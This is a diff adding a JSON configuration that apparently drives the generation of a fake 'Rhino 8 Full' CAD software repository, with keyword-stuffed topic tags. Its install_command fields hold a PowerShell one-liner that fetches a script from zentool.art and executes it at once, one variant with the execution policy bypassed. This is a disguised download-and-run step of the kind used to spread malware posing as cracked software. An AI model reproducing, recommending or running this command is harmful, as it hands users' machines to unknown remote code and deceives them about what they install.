@@ -1,0 +1,28 @@
+{
+  "repo": "Rhino-8-Full",
+  "product": "Rhino 8 Full",
+  "product_title": "Rhino 8",
+  "kind": "cad",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "cad",
+  "topics": [
+    "rhino-8-windows",
+    "rhino-config",
+    "rhino-integration",
+    "rhino-latest",
+    "3d-modeling",
+    "cad-software",
+    "design-tools",
+    "product-design",
+    "visualization",
+    "bim-workflow",
+    "windows-cad",
+    "modeling-tools"
+  ],
+  "site": "zentool.art"
+}
